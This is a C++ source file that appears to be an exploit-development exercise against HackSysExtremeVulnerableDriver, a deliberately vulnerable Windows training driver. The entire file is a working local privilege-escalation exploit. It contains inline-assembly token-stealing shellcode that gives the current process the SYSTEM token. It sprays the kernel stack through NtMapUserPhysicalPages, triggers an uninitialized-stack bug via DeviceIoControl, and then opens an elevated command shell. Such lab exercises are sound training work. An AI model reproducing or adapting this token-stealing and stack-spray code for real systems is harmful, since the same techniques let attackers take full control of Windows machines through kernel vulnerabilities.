#define _CRT_SECURE_NO_WARNINGS 0
#include <iostream>
#include <Windows.h>
#include <Psapi.h>

typedef  BOOL(*pNtMapUserPhysicalPages)(
	PVOID      VirtualAddress,
	ULONG_PTR  NumberOfPages,
	PULONG_PTR PageArray
	);

void pwn() {
	__asm {
		pushad
		xor eax, eax
		mov eax, fs:[eax + 124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4
	SearchSystemPID :
			mov eax, [eax + 0b8h]
			sub eax, 0b8h
			cmp[eax + 0b4h], edx
			jne SearchSystemPID
		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
	}
}

static void cmd() {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

int main()
{
	std::cout << "[+] UninitializedMemoryStack!\n";
	DWORD retLength = 0;
	DWORD inBuffer[4096] = { 0 };
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (!hDevice) {
		std::cout << "[x] Failed to create driver file\n";
		return -1;
	}

	const char *dll_name = "ntdll.dll";
	HMODULE dll = LoadLibraryA(dll_name);
	if (dll == NULL) {
		std::cout << "[x] Failed to load dll\n";
		return -1;
	}

	pNtMapUserPhysicalPages MapUserPhysicalPages = (pNtMapUserPhysicalPages)GetProcAddress(dll, "NtMapUserPhysicalPages");
	if (MapUserPhysicalPages == NULL) {
		std::cout << "[x] Failed to get address of MapUserPhysicalPages\n";
		return -1;
	}

	printf("[+] Shellcode Address: %#x\n", (DWORD)pwn);
	for (int i = 0; i < sizeof(inBuffer) / 4; i++) {
		inBuffer[i] = (DWORD)&pwn;
	}

	//	memset(inBuffer, 'A', sizeof(inBuffer));
	std::cout << "[+] Stack Spray\n";

	if (MapUserPhysicalPages(NULL, 1024, inBuffer) == FALSE) {
		std::cout << "[x] Failed to Stack Spray\n";
		return -1;
	}

	int status = DeviceIoControl(hDevice, 0x22202F, (LPVOID)inBuffer, 0xf0, NULL, 0, &retLength, NULL);
	if (status != 0) {
		std::cout << "[x] Failed to trigger vuln\n";
		return -1;
	}

	cmd();
	//	system("pause");
	std::cout << "[+] EXP NERVER END\n";
	return 0;
}
